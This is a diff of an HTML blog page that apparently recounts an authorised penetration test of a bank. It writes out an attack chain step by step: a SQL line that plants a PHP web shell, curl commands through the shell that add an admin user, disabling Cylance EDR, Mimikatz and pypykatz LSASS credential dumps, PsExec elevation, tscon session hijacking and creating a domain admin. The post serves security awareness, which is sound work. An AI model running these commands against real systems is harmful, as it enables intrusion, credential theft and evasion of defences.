@@ -481,9 +481,9 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise" class="md-nav__link">
+  <a href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-surprise" class="md-nav__link">
     <span class="md-ellipsis">
-      Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a supprise!
+      Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a surprise!
     </span>
   </a>
   
@@ -902,9 +902,9 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise" class="md-nav__link">
+  <a href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-surprise" class="md-nav__link">
     <span class="md-ellipsis">
-      Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a supprise!
+      Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a surprise!
     </span>
   </a>
   
@@ -992,25 +992,46 @@
 <p>It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran:
 <div class="highlight"><pre><span></span><code>dirb<span class="w"> </span>http://targetbank.com/
 </code></pre></div>
-Boom. A treasure trove of exposed files, including a /phpmyadmin/ folder. Classic.
-and I was in. <strong>Rookie mistake #2.</strong></p>
-<h3 id="step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise">Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a supprise!<a class="headerlink" href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-supprise" title="Permanent link">&para;</a></h3>
+Boom. A treasure trove of exposed files, including a <code>/phpmyadmin/</code> folder.</p>
+<div class="highlight"><pre><span></span><code>[ Pentester ]  ---&gt;  [ Web Server ]
+                     /-----------\
+                     |   index/  |
+                     |   admin/  |
+                     | *phpmyadmin/  &lt;-- Found via dirb
+                     |   images/  |
+                     \-----------/
+</code></pre></div>
+<h3 id="step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-surprise">Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a surprise!<a class="headerlink" href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-surprise" title="Permanent link">&para;</a></h3>
 <p>I took a gamble and tried the usual default credentials:
 <div class="highlight"><pre><span></span><code>Username: root
 Password: (blank)
 </code></pre></div>
-Guess what? It worked. Because, of course, it did. 
+Guess what? It worked. Because, of course, it did lol. <strong>Rookie mistake #2.</strong>
 With full control over the database, I simply used <code>SELECT INTO OUTFILE</code> to write a <strong>PHP web shell</strong> directly into <code>htdocs</code>.
 <div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;C:/xampp/htdocs/shell.php&#39;</span><span class="p">;</span>
 </code></pre></div>
 Boom. Webshell live at <code>http://bankserver/shell.php</code>.</p>
+<div class="highlight"><pre><span></span><code>+-----------------------------+
+| Web Shell Created           |
+| URL: /shell.php             |
+| Command: system($_GET[&#39;cmd&#39;]); |
++-----------------------------+
+</code></pre></div>
 <h3 id="step-3-making-myself-at-home-persistence-101">Step 3: Making Myself at Home (Persistence 101)<a class="headerlink" href="#step-3-making-myself-at-home-persistence-101" title="Permanent link">&para;</a></h3>
-<p>Checking the privileges, I realized XAMPP was running under NT AUTHORITY\SYSTEM. Oh, this was going to be fun.<strong>Rookie mistake #3.</strong>
+<p>Checking the privileges, I realized XAMPP was running under NT AUTHORITY\SYSTEM. Oh, this was going to be fun. <strong>Rookie mistake #3.</strong>
 And also, I wasn’t about to leave this beautiful new playground unprotected. So, using my webshell, I ran:
 <div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s2">&quot;http://targetbank.com/shell.php?cmd=net user pentester mysecurepassword /add&quot;</span>
 curl<span class="w"> </span><span class="s2">&quot;http://targetbank.com/shell.php?cmd=net localgroup administrators pentester /add&quot;</span>
 </code></pre></div>
 BOOOOM!!! Hello, new local admin user.</p>
+<div class="highlight"><pre><span></span><code>[ Windows Server ]
++--------------------------------------+
+| Users:                               |
+|  - Administrator                     |
+|  - Guest                              |
+|  - pentester (New Admin!)            |
++--------------------------------------+
+</code></pre></div>
 <h3 id="step-4-fighting-cylance-edr-and-winning">Step 4: Fighting Cylance EDR (and Winning)<a class="headerlink" href="#step-4-fighting-cylance-edr-and-winning" title="Permanent link">&para;</a></h3>
 <p>This is where things got even funnier. Every time I tried to run <strong>Mimikatz</strong>, Cylance EDR slapped me like an overprotective parent. So I tried stopping the service:
 <div class="highlight"><pre><span></span><code>sc<span class="w"> </span>stop<span class="w"> </span>Cylance
@@ -1019,46 +1040,74 @@ BOOOOM!!! Hello, new local admin user.</p>
 <p>But guess what? I could still <strong>change the startup type</strong>:
 <div class="highlight"><pre><span></span><code>sc<span class="w"> </span>config<span class="w"> </span>Cylance<span class="w"> </span><span class="nv">start</span><span class="o">=</span><span class="w"> </span>demand
 </code></pre></div>
-Now, I just needed to <strong>reboot the server.</strong> I used the good old "extended ping" trick to monitor when it was back:
-<div class="highlight"><pre><span></span><code>ping<span class="w"> </span>-t<span class="w"> </span>bankserver
-</code></pre></div>
-As soon as it came online, I refreshed my webshell. This time, <strong>Mimikatz worked like a charm.</strong>
-With Mimikatz, I dumped the LSASS, downloaded it for offline paswword cracking, 
-<div class="highlight"><pre><span></span><code>mimikatz#<span class="w"> </span>sekurlsa::minidump<span class="w"> </span>lsass.dmp
+<div class="highlight"><pre><span></span><code>[ EDR Service: Cylance ]
++----------------------+
+| Status: Running      |
+| Protected: Yes       |
++----------------------+
+
+[ Hacker ] --&gt; sc config Cylance start= demand
+
+[ Server Rebooted ] --&gt; [ Cylance is now disabled! ]
 </code></pre></div></p>
 <h3 id="step-5-rdp-and-session-hijacking">Step 5: RDP and Session Hijacking<a class="headerlink" href="#step-5-rdp-and-session-hijacking" title="Permanent link">&para;</a></h3>
-<p>Since this part now fell under the the greybox part of the assessment, I politely (read: strategically) asked them to allow my RDP traffic through the firewall. Once I was in, I used the persistent account I had created earlier:</p>
-<p><div class="highlight"><pre><span></span><code>rdesktop<span class="w"> </span>-u<span class="w"> </span>pentester<span class="w"> </span>-p<span class="w"> </span>mysecurepassword<span class="w"> </span>targetbank.com
-</code></pre></div>
-Once in, I used <strong>PsExec</strong> to elevate myself to SYSTEM:</p>
-<p><div class="highlight"><pre><span></span><code>PsExec.exe<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>cmd.exe
+<p>Once in, I used <strong>PsExec</strong> to elevate myself to SYSTEM:
+<div class="highlight"><pre><span></span><code>PsExec.exe<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>cmd.exe
 </code></pre></div>
 And ran:
 <div class="highlight"><pre><span></span><code>query<span class="w"> </span>session
 </code></pre></div>
-Guess what? <strong>Administrator</strong> left their session inactive but open. <strong>Rookie mistake #4.</strong>
-I could not let it like this without Hijacking it.</p>
+Guess what? <strong>Administrator</strong> left their session inactive but open. <strong>Rookie mistake #4.</strong></p>
+<p><div class="highlight"><pre><span></span><code>[ Sessions ]
++--------------------------------+
+| ID  | User        | Status     |
+|  0  | SYSTEM      | Active     |
+|  1  | pentester   | Active     |
+|  2  | Administrator | Idle    | &lt;-- (Hijack this!)
++--------------------------------+
+</code></pre></div>
+Then I executed the command below,</p>
 <p><div class="highlight"><pre><span></span><code>tscon<span class="w"> </span><span class="m">2</span><span class="w"> </span>/dest:console
 </code></pre></div>
-And boom—Administrator session hijacked. But then… poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump.</p>
+And......Boom—Administrator session hijacked.</p>
+<p>I was raoming around when I noticed there was a network drive mounted for the user Administrator.
+The mounted directory contained the following:</p>
+<p><div class="highlight"><pre><span></span><code>[ Compromised Bank Server ] --&gt; [ Mounted Shared Drive ]
+                      /------------------------------------\
+                      | Procedures                          |
+                      | Documentation                       |
+                      |     |-&gt; CyberArk_Url.txt            |
+                      |     |-&gt; Other stuffs I can&#39;t recall |
+                      | Procurement                         |
+                      | Reports                             |
+                      |     |-&gt; Pentest report 2023         |
+                      \-------------------------------------/
+</code></pre></div>
+When I saw CyberArk I already knew the more juicy stuffs were held there.(side eye)
+But then… poof! I got kicked out. For some obscure reason, my session got terminated. Maybe someone noticed, maybe it was just dumb luck, but I had to go back to my LSASS dump.</p>
 <p>So, I cracked the dump offline:
 <div class="highlight"><pre><span></span><code>mimikatz.exe<span class="w"> </span><span class="s2">&quot;sekurlsa::minidump lsass.dmp&quot;</span><span class="w"> </span><span class="s2">&quot;sekurlsa::logonpasswords&quot;</span><span class="w"> </span><span class="nb">exit</span>
 </code></pre></div>
-or using Linux:</p>
-<p><div class="highlight"><pre><span></span><code>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>lsass.dmp
+Or using Linux:
+<div class="highlight"><pre><span></span><code>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>lsass.dmp
 </code></pre></div>
-And got creds for BankAdmin1, a local admin account used on multiple critical servers.(because why follow best practices, right?)</p>
+And got creds for BankAdmin1, a local admin account used on multiple critical servers. (because why follow best practices, right?)</p>
 <h3 id="step-6-the-domain-controller-the-cyberark-pam-disaster">Step 6: The Domain Controller &amp; The CyberArk "PAM" Disaster<a class="headerlink" href="#step-6-the-domain-controller-the-cyberark-pam-disaster" title="Permanent link">&para;</a></h3>
-<p>While moving laterally, I hit the <strong>Domain Controller.</strong> This is where things took an unexpected turn. I also found a <strong>network-mounted drive</strong> on the initial compromised machine containing <strong>a plaintext file with a URL to their PAM (CyberArk).</strong> 🤦</p>
-<p>So, being the responsible hacker I am, I:
+<p>While moving laterally, I hit the <strong>Domain Controller.</strong>
+So, I:
     - Used the credentials obtained from LSASS dump cracking.
     - Logged into the Domain Controller.
     - Created a domain admin account.
     - Added special permissions to that account to be able to use the PAM.</p>
-<p>Then I logged into <strong>CyberArk</strong> with my shiny new domain admin account, and... oh boy. <strong>It gave me access to the core banking system.</strong> 
-Because why have proper access controls when you can just let your pentester waltz right in?</p>
-<p><em>Insert evil laughter here.</em></p>
+<p>Then I logged into <strong>CyberArk</strong> and... oh boy. <strong>It gave me access to the core banking system.</strong></p>
 <h2 id="the-aftermath">The Aftermath<a class="headerlink" href="#the-aftermath" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>+---------------------------------------+
+| [ Hacker ] --&gt; &quot;Mission Complete 😏&quot;  |
+| - Domain Admin Access                 |
+| - Bypassed EDR                         |
+| - Full Control of Bank Network         |
++---------------------------------------+
+</code></pre></div>
 <p>At this point, I basically had the <strong>keys to the kingdom.</strong> This entire chain of failures was due to a mix of:
 1. <strong>Directory listing enabled</strong>
 2. <strong>phpMyAdmin with default creds</strong>
@@ -1066,7 +1115,6 @@ Because why have proper access controls when you can just let your pentester wal
 4. <strong>EDR that I could disable with a simple restart</strong>
 5. <strong>A bank that stored their own security tool URLs in a plaintext file</strong>
 6. <strong>Domain-wide local admin credentials</strong></p>
-<p><strong>If this wasn’t a real pentest, it would have made a fantastic heist movie.</strong></p>
 <h2 id="moral-of-the-story">Moral of the Story:<a class="headerlink" href="#moral-of-the-story" title="Permanent link">&para;</a></h2>
 <p>Secure your systems, disable default credentials, and please don’t leave your privileged accounts lying around. Otherwise, you’ll end up reading about your security failures in a blog post like this. 😏</p>
 
